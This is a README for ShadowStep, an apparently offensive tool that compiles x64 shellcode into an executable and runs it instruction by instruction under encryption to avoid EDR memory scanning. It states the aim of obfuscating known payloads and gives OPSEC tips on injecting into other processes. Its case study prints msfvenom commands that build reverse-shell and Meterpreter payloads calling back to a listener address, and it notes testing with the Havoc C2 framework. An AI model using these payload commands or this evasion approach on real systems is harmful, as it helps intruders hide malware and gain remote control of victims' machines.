# ShadowStep
**In-memory Encrypted Shellcode Execution Suite**  
ShadowStep is a research-oriented tool designed to execute an encrypted shellcode, ensuring that it is **never fully decrypted** in memory. At any given time, only a single instruction is available in plaintext, significantly reducing exposure to traditional memory-scanning techniques.

![shadowstep](https://github.com/jtalamini/shadowstep/blob/main/shadowstep.png)

Many endpoint detection systems rely, among other techniques, on static memory pattern scanning to identify malicious payloads. ShadowStep mitigates this approach by decrypting, executing, and immediately re-encrypting shellcode instructions one at a time.

> ⚠️ This project is intended for research, educational, and defensive security purposes only.

## Index
- [Key Concept](#key-concept)
- [Structure](#structure)
- [Setup](#setup)
  - [Requirements](#requirements)
  - [CLI Setup](#cli-setup)
  - [GUI Setup](#gui-setup)
- [Troubleshooting](#troubleshooting)
- [Usage](#usage)
- [OPSEC](#opsec)
- [Case Study](#case-study)
- [Environment Cleanup](#environment-cleanup)
- [Acknowledgements](#acknowledgements)
- [Licensing](#licensing)

## Key Concept

ShadowStep implements a custom single-step execution engine for encrypted shellcodes.
Instead of relying on exception handlers or CPU flags, it temporarily swaps the execution context of the host process with a virtual context in which the shellcode is executed instruction-by-instruction.
At no point does the full shellcode exist in decrypted form in memory.

This implementation focuses on an original approach and on reducing observable execution artifacts:
- No exception handler (VEH / SEH) registration required
- No need to configure specific flags
- More efficient than other single-step methods based on trap flag and exception handlers
- No suspicious behavior (HW/SW breakpoints, ...) commonly associated with debugging or emulation-based execution
- To the best of my knowledge, there are no inherent limitations on the opcodes that can be used by the shellcode

You might consider using this project if you have these objectives in mind:  
- Apply an additional obfuscation layer to otherwise detectable or known payloads
- Integrate encrypted execution into an already developed custom loader
- Increase code resistance to static memory analysis
- Increase the effort required for reverse engineering


## Structure

> 🚧 This project is currently under development. Functionalities and documentation may change as the tool evolves.

The solution `ShadowStep` contains two Visual Studio projects:  
- `ShadowStep.Compiler` used to build `ShadowStep.Compiler.exe`: this binary implements ShadowStep on a given shellcode.
- `ShadowStep.Runtime` used by `ShadowStep.Compiler.exe` to build your custom executable using ShadowStep.

## Setup

### Requirements
- **Visual Studio (Windows)** installed with the **Desktop development with C++** workload.
  - Make sure **MSBuild** and the **Windows SDK** are included.

### CLI Setup

1. Install vcpkg from the Command Line:  
```cmd
git clone https://github.com/microsoft/vcpkg.git
cd vcpkg
bootstrap-vcpkg.bat -disableMetrics
```

2. Install Capstone static library:   
```cmd
vcpkg install capstone[x86]:x64-windows-static
```

3. Add the integration for Visual Studio:  
```cmd
vcpkg integrate install
```

4. Open a Developer Command Prompt for VS. Build the ShadowStep Compiler using MSBuild:  
```cmd
git clone git@github.com:jtalamini/shadowstep.git
msbuild shadowstep\ShadowStep.Compiler\ShadowStep.Compiler.vcxproj /t:Clean,Build /p:Configuration=Release /p:Platform=x64
```

You might choose to build the project with Visual Studio as well.

### GUI Setup

1. Clone this repo:  
```cmd
git clone git@github.com:jtalamini/shadowstep.git
```

2. Download [Capstone](https://github.com/capstone-engine/capstone) and install it somewhere on your machine (e.g., C:\libs\capstone).

Open the solution in Visual Studio and configure the `ShadowStep.Compiler` project to use Capstone.   

**3. Add Capstone headers**   
Navigate to:  
```
(ShadowStep.Compiler) Project → Properties → C/C++ → General → Additional Include Directories
```
add the path to the include folder (e.g., C:\libs\capstone\include).

**4. Add the library to the linker**  
Navigate to:  
```
(ShadowStep.Compiler) Project → Properties → Linker → General → Additional Library Directories
```
add the path to the folder containing capstone.lib (e.g., C:\libs\capstone\lib or C:\libs\capstone\msvc)

**5. Link the library**  
Navigate to:  
```
(ShadowStep.Compiler) Project → Properties → Linker → Input → Additional Dependencies
```

add the value `capstone.lib`

6. Finally, build the `ShadowStep.Compiler` project using Visual Studio.

## Troubleshooting

**MSB8020: Platform Toolset 'v143' cannot be found**  

If you see an error like:

```text
error MSB8020: The build tools for Visual Studio 2022 (Platform Toolset = 'v143') cannot be found.
To build using the v143 build tools, please install Visual Studio 2022 build tools.
Alternatively, you may upgrade to the current Visual Studio tools by selecting the Project menu
or right-click the solution, and then selecting "Retarget solution".
```
It usually means the project is targeting a Visual Studio toolset that is not installed on your machine.

**Solution 1**  
Install the missing toolset (recommended if you want to keep v143):  
Install Visual Studio 2022 (or the Visual Studio 2022 Build Tools) and ensure the Desktop development with C++ workload is enabled (MSVC v143, Windows SDK, MSBuild).

**Solution 2**  
Retarget the solution to the toolset installed on your system:
Open the solution file (ShadowStep.sln) in Visual Studio.  
When prompted, accept the Retarget action, or manually:  
Right-click the solution in Solution Explorer → Retarget solution
Select the installed Windows SDK/toolset version

## Usage

Open a Developer Command Prompt for VS.  
Execute the ShadowStep Compiler:  
```cmd
.\ShadowStep.Compiler.exe <path-to-your-shellcode> <path-to-the-shadowstep-runtime-project-file>
```
The mandatory arguments are:  
- `<path-to-your-shellcode>` is the path of a .bin file which contains your shellcode
- `<path-to-the-shadowstep-runtime-project-file>` is the full path of the `ShadowStep.Compiler\ShadowStep.Runtime.vcxproj` project file.

This generates a ready-to-use x64 executable file that implements ShadowStep on the given shellcode.
Since `ShadowStep.Compiler.exe` automatically builds the `ShadowStep.Runtime` project using _msbuild_, the resulting file should be under `ShadowStep.Runtime\x64\`.

> ⚠️ This project supports only x64 shellcodes as a design choice.

## OPSEC
Detection of the artifacts generated using ShadowStep is _still possible_ for instance when used to obfuscate C2 payloads that rely on spawning new processes in which they write BOFs to execute them.

Since ShadowStep focuses on memory visibility reduction -- and not complete behavioral stealth -- some adjustments to the generated code might be needed for custom usage:
- The shellcode injection code uses standard Windows API but it can be customized.
- By default the shellcode is injected into the current process. Feel free to change `hProcess` in order to target a different process.
- ShadowStep currently supports only XOR and RC4 as encryption methods.

## Case Study
This suite was tested on the following _msfvenom_ payloads:
- `msfvenom -p windows/x64/exec CMD="calc.exe" -f raw -o calc.bin`
- `msfvenom -p windows/x64/shell_reverse_tcp LHOST=192.168.1.3 LPORT=9999 -f raw -o revshell.bin`
- `msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=192.168.1.3 LPORT=4444 -f raw -o met.bin`

It was also tested on `Havoc C2` framework, but as already mentioned, since most agents execute BOFs and spawn a new process every time it is not possible to rely on ShadowStep to hide that kind of execution.

## Environment Cleanup
This section explains how to remove everything you installed to build ShadowStep, depending on the setup method you followed.

**Cleanup after CLI setup**  

1. Remove the Capstone package:
```cmd
vcpkg remove capstone[x86]:x64-windows-static
```

2. Undo Visual Studio integration:
```cmd
vcpkg integrate remove
```

3. Delete the `vcpkg` folder you cloned.

5. Delete the `ShadowStep` folder you cloned.  

**Cleanup after GUI setup**

If you manually downloaded and installed Capstone:

1. Delete the Capstone directory you placed on disk (e.g., `C:\libs\capstone\`).  

3. Delete the `ShadowStep` folder you cloned.  

## Acknowledgements
[Capstone](https://github.com/capstone-engine/capstone) developers for providing a powerful and well-designed disassembly framework that made this research possible.  
[vari.sh](https://github.com/vari-sh) for the wonderful artwork and for providing valuable feedbacks during development.  
[devisions](https://github.com/devisions) for supporting the development of this tool.

## Licensing
This project is licensed under the MIT License. See the accompanying [LICENSE](./LICENSE) file for more information.
